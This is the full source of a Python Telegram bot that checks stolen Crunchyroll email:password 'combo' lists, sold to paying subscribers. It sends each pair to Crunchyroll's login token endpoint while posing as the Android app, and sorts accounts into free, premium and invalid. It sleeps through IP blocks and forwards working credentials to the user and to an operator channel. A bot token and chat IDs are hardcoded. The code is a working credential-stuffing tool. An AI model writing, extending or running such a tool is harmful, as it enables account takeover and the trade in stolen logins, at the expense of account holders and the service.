import os
import sys
import telebot
import requests
import time
import json
from datetime import datetime, timedelta
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = '7435038616:AAGrf-TV8CY_MgPwaIrG0TQ-gJYqDOT4i3U'
YOUR_CHAT_ID = '-1002179100879'
bot = telebot.TeleBot(API_TOKEN)

def restart_bot():
    # Restart the current script
    os.execv(sys.executable, ['python'] + sys.argv)

def forward_and_reply(chat_id, text):
    bot.send_message(chat_id, text)
    bot.send_message(YOUR_CHAT_ID, f"Forwarded message to user {chat_id}: {text}")

def forward_and_reply_with_username(chat_id, text, username):
    bot.send_message(chat_id, f"{text} checked by @{username}")
    bot.send_message(YOUR_CHAT_ID, f"Forwarded message to user {chat_id}: {text} checked by @{username}")

def check_crunchyroll_account(email, password):
    device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "host": "beta-api.crunchyroll.com",
        "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
        "x-datadog-sampling-priority": "0",
        "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
    }
    data = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G9810",
        "device_type": "samsung SM-G955N"
    }

    response = requests.post(url, headers=headers, data=data)
    print(response.text)
    if response.status_code == 200:
        response_text = response.text
        if "account content mp:limited offline_access" in response_text:
            return 'good'
        elif "account content mp offline_access reviews talkbox" in response_text:
            return 'premium'
        elif "406 Not Acceptable" in response_text:
            return 'block'
    return 'bad'

def create_status_keyboard(results):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton(f"Total: {results['total']}", callback_data="total"),
        InlineKeyboardButton(f"Good: {results['good']}", callback_data="good")
    )
    keyboard.row(
        InlineKeyboardButton(f"Premium: {results['premium']}", callback_data="premium"),
        InlineKeyboardButton(f"Bad: {results['bad']}", callback_data="bad")
    )
    return keyboard

with open('chrunch.json', 'r') as file:
    data = json.load(file)
    subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = str(message.chat.id)
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    if chat_id not in subscribers:
        forward_and_reply(chat_id, "👋 hello welcome to our beta crunchyroll checker for free user use this command  /crunch, if you need access than contant our admins. Contact @omt152.")
        return

    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()

    if current_date > expiry_date:
        forward_and_reply(chat_id, "Sorry, your premium subscription has expired.")
    else:
        forward_and_reply(chat_id, "you are access able of this part now you check combo thanks ")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = str(message.chat.id)
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    if chat_id not in subscribers:
        forward_and_reply(chat_id, "Not for free user. Take access from our admin:  @omt152.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open("combo.txt", 'wb') as new_file:
        new_file.write(downloaded_file)

    with open("combo.txt", 'r') as file:
        combos = file.readlines()

    results = {'total': len(combos), 'good': 0, 'premium': 0, 'bad': 0}

    status_message = bot.send_message(
        message.chat.id,
        "🔍 Checking accounts...",
        reply_markup=create_status_keyboard(results)
    )

    for combo in combos:
        try:
            email, password = combo.strip().split(':', 1)
            result = check_crunchyroll_account(email, password)

            if result == 'good':
                results['good'] += 1
                forward_and_reply_with_username(chat_id, f"✅ Crunchyroll Good: {email}:{password}\nBot by: Our", message.from_user.username)
            elif result == 'premium':
                results['premium'] += 1
                forward_and_reply_with_username(chat_id, f"💎 Crunchyroll Premium: {email}:{password}\nBot by: Our", message.from_user.username)
            elif result == 'block':
                forward_and_reply(chat_id, "❗ Sorry, we have to wait 5 minutes due to IP block.")
                time.sleep(360)
            else:
                results['bad'] += 1
            time.sleep(2)
            bot.edit_message_reply_markup(
                message.chat.id,
                status_message.message_id,
                reply_markup=create_status_keyboard(results)
            )
        except ValueError as e:
            forward_and_reply(chat_id, f"Error processing line: {combo.strip()} - {str(e)}")

@bot.message_handler(commands=['crunch'])
def handle_chk(message):
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    try:
        command, credentials = message.text.split(' ', 1)
        email, password = credentials.split(':')

        result = check_crunchyroll_account(email, password)

        if result == 'good':
            forward_and_reply_with_username(message.chat.id, f" Crunchyroll free: {email}:{password}\nBot by: Our", message.from_user.username)
        elif result == 'premium':
            forward_and_reply_with_username(message.chat.id, f"💎 Crunchyroll Premium: {email}:{password}\nBot by: Our", message.from_user.username)
        elif result == 'block':
            forward_and_reply(message.chat.id, "❗ Sorry, we have to wait 5 minutes due to IP block.")
            time.sleep(360)
        else:
            forward_and_reply(message.chat.id, f"❌ Bad: {email}:{password}")
    except Exception as e:
        forward_and_reply(message.chat.id, "Invalid format. Use /crunch email:password")

def load_data():
    with open('chrunch.json', 'r') as file:
        return json.load(file)

def save_data(data):
    with open('chrunch.json', 'w') as file:
        json.dump(data, file, indent=4)

Admins = ['1504978999'] 

@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    if str(message.chat.id) not in Admins:
        forward_and_reply(message.chat.id, "You are not authorized to use this command.")
        return

    data = load_data()
    response = ""
    for subscriber in data['subscribers']:
        response += f"ID: {subscriber['id']} - Expiry Date: {subscriber['expiry_date']}\n"

    forward_and_reply(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    if str(message.chat.id) not in Admins:
        forward_and_reply(message.chat.id, "kya be jyada aage ja raha hai tu .")
        return

    args = message.text.split()
    if len(args) < 2:
        forward_and_reply(message.chat.id, "Please provide a subscriber ID to kick.")
        return

    subscriber_id_to_kick = args[1]
    data = load_data()
    original_subscriber_count = len(data['subscribers'])
    data['subscribers'] = [sub for sub in data['subscribers'] if sub['id'] != subscriber_id_to_kick]

    if len(data['subscribers']) == original_subscriber_count:
        forward_and_reply(message.chat.id, "Subscriber ID not found.")
    else:
        save_data(data)
        forward_and_reply(message.chat.id, f"Subscriber {subscriber_id_to_kick} has been removed.")
        restart_bot()

@bot.message_handler(commands=['allow'])
def allow_subscriber(message):
    bot.forward_message(YOUR_CHAT_ID, message.chat.id, message.message_id)
    if str(message.chat.id) not in Admins:
        forward_and_reply(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        forward_and_reply(message.chat.id, "Please provide a subscriber ID and number of days.")
        return

    new_id, days = args[1], int(args[2])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    data = load_data()
    data['subscribers'].append({'id': new_id, 'expiry_date': expiry_date})
    save_data(data)
    forward_and_reply(message.chat.id, f"Subscriber {new_id} added with expiry on {expiry_date}.")
    restart_bot()

bot.infinity_polling()
